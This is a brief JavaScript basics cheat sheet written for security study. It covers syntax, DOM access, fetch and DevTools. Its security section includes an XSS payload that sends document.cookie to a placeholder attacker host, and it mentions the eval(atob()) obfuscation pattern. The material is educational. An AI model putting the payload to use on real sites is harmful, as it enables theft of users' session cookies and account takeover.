# JavaScript — basics (for security)

Why: understand client-side logic, XSS payloads, read frontend code, DevTools/Burp, DOM attacks.

## Syntax
```javascript
let x = 5; const PI = 3.14;        // let/const (modern), var (legacy)
function add(a,b){ return a+b; }   const mul = (a,b) => a*b;
if (x>0){...} else {...}
for (let i=0;i<10;i++){...}   arr.forEach(v => console.log(v));
```

## DOM
```javascript
document.getElementById("id"); document.querySelector(".class");
document.cookie;                   // XSS target
localStorage.getItem("token");
element.innerHTML = "<b>x</b>";    // inserting HTML (XSS risk)
```

## Requests (fetch)
```javascript
fetch("http://api/data").then(r => r.json()).then(d => console.log(d));
fetch("/login", {method:"POST", body:JSON.stringify({u:"a"}),
  headers:{"Content-Type":"application/json"}});
```

## For security
- **XSS payload:** `<script>fetch('http://attacker/?c='+document.cookie)</script>`.
- **DevTools (F12):** Console (run JS), Network (API), Sources (code), Application (cookies/storage).
- **Obfuscation:** `eval(atob("base64"))` — decode+run (seen in malware/payloads).
- Client-side validation is NOT security — bypass in DevTools/Burp.
- **Node.js** — server JS; risks: command injection via `child_process`, prototype pollution.
